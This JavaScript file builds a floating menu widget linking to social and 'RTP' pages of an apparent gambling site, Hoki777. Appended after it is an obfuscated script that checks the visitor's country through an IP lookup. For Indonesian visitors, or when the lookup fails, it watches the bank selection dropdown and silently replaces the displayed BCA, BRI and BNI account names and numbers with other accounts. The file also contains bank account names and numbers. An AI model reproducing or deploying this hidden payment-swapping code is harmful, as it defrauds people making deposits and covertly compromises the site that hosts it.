(function () {
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
    .widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://hk777.top/telegramgruphoki777/" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/wahoki777" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/RTP-Hoki777" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/facebookgruphoki777/" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Hoki777" width="30" height="30">
                    </div>
                </a>
            </div>
        </div>
        
        <img src="https://yudha125.github.io/menu-widget/Image/hoki.webp" alt="Logo Hoki777" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Hoki777" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);

})();

(function(_0xdc992d,_0x5d619f,_0xb36gcf,_0xg8ba){_0x5d619f="DI".split("").reverse().join("");_0xdc992d=(912899^912901)+(861159^861153);_0xb36gcf="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";_0xg8ba="\u0062\u0061\u006E\u006B\u0053\u0065\u006C\u0065\u0063\u0074";const _0x64dfe={"BCA":{'\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u0061\u006D\u0061\u0041\u0073\u006C\u0069':"\u0052\u0058\u0058\u0058\u0059\u0020\u0041\u0058\u0058\u0058\u0059\u0041",'\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u006F\u006D\u006F\u0072\u0041\u0073\u006C\u0069':"\u0037\u0033\u0039\u0031\u0039\u0035\u0033\u0030\u0031\u0039","namaBaru":"\u004C\u0045\u0056\u0049","nomorBaru":"\u0032\u0031\u0032\u0030\u0034\u0035\u0032\u0030\u0030\u0035"},"BRI":{"targetNamaAsli":"\u0043\u0041\u004E\u0044\u0052\u0041\u0020\u0044\u0045\u0057\u0049",'\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u006F\u006D\u006F\u0072\u0041\u0073\u006C\u0069':"\u0030\u0038\u0033\u0039\u002D\u0030\u0031\u0030\u0030\u002D\u0035\u0037\u0038\u0031\u002D\u0035\u0030\u0039",'\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':"LUSIANA","nomorBaru":"\u0030\u0033\u0034\u0035\u0030\u0031\u0030\u0035\u0030\u0032\u0031\u0031\u0035\u0030\u0036"},"\u0042\u004E\u0049":{'\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u0061\u006D\u0061\u0041\u0073\u006C\u0069':"SARIANI","targetNomorAsli":"\u0031\u0038\u0030\u0030\u0030\u0038\u0038\u0037\u0030\u0036",'\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':"\u0052\u0049\u0046\u0041\u004C",'\u006E\u006F\u006D\u006F\u0072\u0042\u0061\u0072\u0075':"1796377133"}};function _0xcea(text){return text['\u0074\u006F\u004C\u006F\u0077\u0065\u0072\u0043\u0061\u0073\u0065']()['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u005B\u2019\u2018\u005D','\u0067'),"\u0027")['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp("+s\\".split("").reverse().join(""),'\u0067'),"\u0020")['\u0074\u0072\u0069\u006D']();}function _0xf_0xed3(){const _0x647b=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0xg8ba);if(!_0x647b)return;const _0x5af7f=_0x647b['\u006F\u0070\u0074\u0069\u006F\u006E\u0073'][_0x647b['\u0073\u0065\u006C\u0065\u0063\u0074\u0065\u0064\u0049\u006E\u0064\u0065\u0078']]['\u0074\u0065\u0078\u0074']['\u0074\u0072\u0069\u006D']()['\u0074\u006F\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065']();const _0x0865f=_0x64dfe[_0x5af7f];if(!_0x0865f)return;var _0x11ffd=(167577^167579)+(375929^375932);const _0x7e9ggb=_0xcea(_0x0865f['\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u0061\u006D\u0061\u0041\u0073\u006C\u0069']);_0x11ffd=560490^560490;var _0x5ed8c=(679238^679232)+(748992^749001);const _0x1d5f=_0xcea(_0x0865f['\u0074\u0061\u0072\u0067\u0065\u0074\u004E\u006F\u006D\u006F\u0072\u0041\u0073\u006C\u0069']);_0x5ed8c=(725444^725453)+(946571^946575);document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("naps".split("").reverse().join(""))['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](span=>{let _0x75868g;const text=_0xcea(span['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']);_0x75868g=(723565^723564)+(716289^716294);if(text['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](_0x1d5f)){span['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x0865f['\u006E\u006F\u006D\u006F\u0072\u0042\u0061\u0072\u0075'];}});document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("vid".split("").reverse().join(""))['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](div=>{var _0xac_0xca2=(871667^871667)+(999299^999297);const text=_0xcea(div['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']);_0xac_0xca2=(698233^698225)+(832387^832385);if(text['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](_0x7e9ggb)){div['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x0865f['\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075'];}});}function _0x13dd(){var _0x8e1ba=(680203^680202)+(550081^550088);const _0x3342ab=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0xg8ba);_0x8e1ba=(972813^972809)+(660288^660293);if(!_0x3342ab)return false;_0xf_0xed3();if(!_0x3342ab['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0x3342ab['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("egnahc".split("").reverse().join(""),_0xf_0xed3);_0x3342ab['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="\u0074\u0072\u0075\u0065";}return!![];}function _0x27938f(){if(_0x13dd())return;const _0xffda3b=new MutationObserver(()=>{if(_0x13dd())_0xffda3b['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0xffda3b['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{'\u0063\u0068\u0069\u006C\u0064\u004C\u0069\u0073\u0074':!![],"subtree":!![]});}async function _0xb26gc(){try{var _0xef5d4a=(746887^746880)+(398749^398747);const _0x91212e=await fetch(_0xb36gcf);_0xef5d4a=573561^573561;if(!_0x91212e['\u006F\u006B'])throw new Error("\u0041\u0050\u0049\u0020\u0045\u0072\u0072\u006F\u0072");const _0xe61a=await _0x91212e['\u006A\u0073\u006F\u006E']();var _0x758bd=(642622^642621)+(889923^889924);const _0xd1d67d=_0xe61a['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];_0x758bd=(926812^926811)+(317443^317445);if(_0xd1d67d===_0x5d619f){_0x27938f();}}catch(err){_0x27938f();}}_0xb26gc();})();
